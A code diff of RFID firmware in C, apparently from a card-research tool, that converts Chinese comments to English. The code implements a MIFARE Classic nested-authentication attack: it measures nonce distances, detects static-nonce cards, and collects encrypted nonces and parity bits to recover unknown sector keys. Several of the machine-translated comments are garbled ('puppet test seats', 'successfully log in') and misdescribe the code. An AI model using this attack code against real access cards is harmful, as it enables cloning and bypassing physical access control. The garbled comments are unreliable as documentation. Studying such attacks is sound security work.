 *
 */
 uint8_t Measure_Distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t *distance) {
@@ -763,50 +762,50 @@ uint8_t Measure_Distance(uint64_t u64Key, uint8_t block, uint8_t type, uint32_t 
     uint8_t index = 0;
 
     do {
-        // 重置卡片通信
+        // Reset card communication
         pcd_14a_reader_halt_tag();
-        // 我们进行快速选卡，尽可能的将验证耗时压缩
+        // We will choose a fast card, and we will be compressed to verify as much as possible
         if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
             NRF_LOG_INFO("Tag can't select\r\n");
             return HF_TAG_NO;
         }
-        // 进行第一次验证，以便获取未经加密的NT1
+        // Perform the first verification in order to obtain the unblocked NT1
         if (authex(pcs, uid, block, type, u64Key, AUTH_FIRST, &nt1) != HF_TAG_OK) {
             NRF_LOG_INFO("Auth failed 1\r\n");
             return MF_ERRAUTH;
         }
-        // 进行嵌套验证，以便获取经过加密的NT2_ENC
+        // Met the nested verification to obtain the encrypted NT2_ENC
         if (authex(pcs, uid, block, type, u64Key, AUTH_NESTED, &nt2) != HF_TAG_OK) {
             NRF_LOG_INFO("Auth failed 2\r\n");
             return MF_ERRAUTH;
         }
-        // 判断两个随机数是否是相同的，正常情况下，
-        // 我们不可能的带相同的随机数，因为PRNG是随时在更新chip的
-        // 如果确实遇到了相同的NT，那么只能说明，这张卡是特殊固件的ST卡
+        // Determine whether the two random numbers are the same, under normal circumstances,
+        // We can't bring the same random number, because PRNG is updating chip at any time
+        // If you really encounter the same NT, then it can only be explained that this card is a ST card for special firmware
         if (nt1 == nt2) {
             NRF_LOG_INFO("StaticNested: %08x vs %08x\n", nt1, nt2);
             return NESTED_TAG_IS_STATIC;
         }
-        // 测量完成之后存放到buffer中
+        // After the measurement is completed, store in the buffer
         distances[index++] = measure_nonces(nt1, nt2);
         // dbg_block_printf("dist = %"PRIu32"\n\n", distances[index - 1]);
     } while (index < DIST_NR);
 
-    // 最终计算两个NT的距离并且直接传出
+//The final calculation of the distance between the two NTs and spread it directly
     *distance =  measure_medin(distances, DIST_NR);
-    // 需要返回OK值，以标志任务成功
+// You need to return the OK value to successfully log in
     return HF_TAG_OK;
 }
 
 /**
-* @brief    : Nested核心，用于收集随机数，此函数只负责收集，不负责转换与解析为KS
-* @param    :pnc         : nested 核心结构体，保存相关的通信数据
-* @param    :keyKnown    : 卡片的已知秘钥的U64值
-* @param    :blkKnown    : 卡片的已知秘钥的所属扇区
-* @param    :typKnown    : 卡片的已知秘钥的类型, 0x60(A秘钥) 或者 0x61(B秘钥)
-* @param    :targetBlock : 需要nested攻击的目标扇区
-* @param    :targetType  : 需要nested攻击的目标秘钥类型
-* @retval   : 成功返回 HF_TAG_OK ，验证不成功返回非 HF_TAG_OK 值
+* @brief    : Nested core, used to collect random numbers. This function is only responsible for collecting, not responsible for conversion and analysis as KS
+* @param    :pnc         :Nested core structure, save related communication data
+* @param    :keyKnown    : The U64 value of the known secret key of the card
+* @param    :blkKnown    :The owner of the known secret key of the card
+* @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
+* @param    :targetBlock : The target sector that requires a Nested attack
+* @param    :targetType  :The target key type requires the Nested attack
+* @retval   : Successfully return hf_tag_ok, verify the unsuccessful return of the non -hf_tag_ok value
 *
 */
 uint8_t Nested_Recover_Core(NestedCore *pnc, uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType) {
@@ -816,27 +815,27 @@ uint8_t Nested_Recover_Core(NestedCore *pnc, uint64_t keyKnown, uint8_t blkKnown
     uint8_t parity[4] = {0x00};
     uint8_t answer[4] = {0x00};
     uint32_t uid, nt1;
-    // 转换UID为U32类型，后面用得上
+    //Convert UID to U32 type, which can be used later
     uid = get_u32_tag_uid(p_tag_info);
-    // 重置卡片通信
+    // Reset card communication
     pcd_14a_reader_halt_tag();
-    // 快速选卡，以便完成验证步骤收集NT1和NT2_ENC
+    // Quickly select the card to complete the verification steps to collect NT1 and NT2_ENC
     if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
         return HF_TAG_NO;
     }
-    // 第一步验证，基础验证不需要嵌套加密
+    //The first step verification, basic verification does not require nested and encrypted
     if (authex(pcs, uid, blkKnown, typKnown, keyKnown, AUTH_FIRST, &nt1) != HF_TAG_OK) {
         return MF_ERRAUTH;
     }
-    // 然后就是嵌套验证
+    // Then there is nested verification
     if (sendcmd(pcs, AUTH_NESTED, targetType, targetBlock, &status, answer, parity, U8ARR_BIT_LEN(answer)) != 32) {
         return HF_ERRSTAT;
     };
-    // 第一次验证的明文随机数
+    // The first verified explicitly random number
     num_to_bytes(nt1, 4, pnc->nt1);
-    // 嵌套验证的被目标扇区的密码加密的随机数
+    // The random number of the password encryption of the nested verification verification
     memcpy(pnc->nt2, answer, 4);
-    // 保存3个bit的奇偶校验位
+    //Save 3 bit's puppet test seats
     pnc->par = 0;
     pnc->par |= ((oddparity8(answer[0]) != parity[0]) << 0);
     pnc->par |= ((oddparity8(answer[1]) != parity[1]) << 1);
@@ -845,24 +844,24 @@ uint8_t Nested_Recover_Core(NestedCore *pnc, uint64_t keyKnown, uint8_t blkKnown
 }
 
 /**
-* @brief    : Nested默认实现，用于收集 SETS_NR 组随机数，此函数只负责收集，不负责转换与解析为KS
-* @param    :ncs         : nested 核心结构体数组，保存相关的通信数据
-* @param    :keyKnown    : 卡片的已知秘钥的U64值
-* @param    :blkKnown    : 卡片的已知秘钥的所属扇区
-* @param    :typKnown    : 卡片的已知秘钥的类型, 0x60(A秘钥) 或者 0x61(B秘钥)
-* @param    :targetBlock : 需要nested攻击的目标扇区
-* @param    :targetType  : 需要nested攻击的目标秘钥类型
-* @retval   : 攻击返回 HF_TAG_OK ，攻击不成功返回非 HF_TAG_OK 值
+* @brief    :NESTED is implemented by default to collect random numbers of the sets_nr group. This function is only responsible for collecting, not responsible for conversion and analysis as KS
+* @param    :ncs         : Nested core structure array, save related communication data
+* @param    :keyKnown    : The U64 value of the known secret key of the card
+* @param    :blkKnown    :The owner of the known secret key of the card
+* @param    :typKnown    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
+* @param    :targetBlock : The target sector that requires a Nested attack
+* @param    :targetType  : The target key type requires the Nested attack
+* @retval   :The attack returns hf_tag_ok, the attack is unsuccessful to return the non -hf_tag_ok value
 *
 */
 uint8_t Nested_Recover_Key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown, uint8_t targetBlock, uint8_t targetType, NestedCore ncs[SETS_NR]) {
     uint8_t m, res;
-    // 先寻卡，所有的操作都要基于有卡的情况
+    // Survening card, all operations must be based on the card
     res = pcd_14a_reader_scan_auto(p_tag_info);
     if (res != HF_TAG_OK) {
         return res;
     }
-    // 然后采集指定个数的随机数组
+    //Then collect the specified number of random array
     for (m = 0; m < SETS_NR; m++) {
         res = Nested_Recover_Core(
                   &(ncs[m]),
@@ -880,33 +879,33 @@ uint8_t Nested_Recover_Key(uint64_t keyKnown, uint8_t blkKnown, uint8_t typKnown
 }
 
 /**
-* @brief    : Nested 距离探测实现
-* @param    :block   : 卡片的已知秘钥的所属扇区
-* @param    :type    : 卡片的已知秘钥的类型, 0x60(A秘钥) 或者 0x61(B秘钥)
-* @param    :key     : 卡片的已知秘钥的U64值
-* @param    :nd      : 随机数距离的探测结果
-* @retval   : 操作状态值
+* @brief    : NestedFollow detection implementation
+* @param    :block   :The owner of the known secret key of the card
+* @param    :type    : Types of the known secret key of the card, 0x60 (A secret) or 0x61 (B secret)
+* @param    :key     : The U64 value of the known secret key of the card
+* @param    :nd      : Random number distance detection results
+* @retval   : Operating status value
 *
 */
 uint8_t Nested_Distacne_Detect(uint8_t block, uint8_t type, uint8_t *key, NestedDist *nd) {
     uint8_t status      = HF_TAG_OK;
     uint32_t distance   = 0;
-    // 必须要确保场内有卡
+    //Must ensure that there is a card on the court
     status = pcd_14a_reader_scan_auto(p_tag_info);
     if (status != HF_TAG_OK) {
         return status;
     } else {
-        // 至少卡片是存在的，可以先复制UID到缓冲区
+        // At least the card exists, you can copy the UID to the buffer first
         get_4byte_tag_uid(p_tag_info, nd->uid);
     }
-    // 获取距离，为接下来的攻击做准备
+    // Get distance, prepare for the next attack
     status = Measure_Distance(
                  bytes_to_num(key, 6),
                  block,
                  type,
                  &distance
              );
-    // 一切正常，我们需要将距离值放入结果中
+    // Everything is normal, we need to put the distance value into the result
     if (status == HF_TAG_OK) {
         num_to_bytes(distance, 4, nd->distance);
     }
@@ -914,15 +913,15 @@ uint8_t Nested_Distacne_Detect(uint8_t block, uint8_t type, uint8_t *key, Nested
 }
 
 /**
-* @brief    : 使用基于RC522的M1算法模块去验证密钥
-* @retval   : 验证结果
+* @brief    : Use the RC522 M1 algorithm module to verify the key
+* @retval   : validationResults
 *
 */
 uint8_t auth_key_use_522_hw(uint8_t block, uint8_t type, uint8_t *key) {
-    // 每次验证一个block都要重新寻卡
+    // Each verification of a block must re -find a card
     if (pcd_14a_reader_scan_auto(p_tag_info) != HF_TAG_OK) {
         return HF_TAG_NO;
     }
-    // 寻到卡后我们开始验证！
+    // After finding the card, we start to verify!
     return pcd_14a_reader_mf1_auth(p_tag_info, type, block, key);
 }
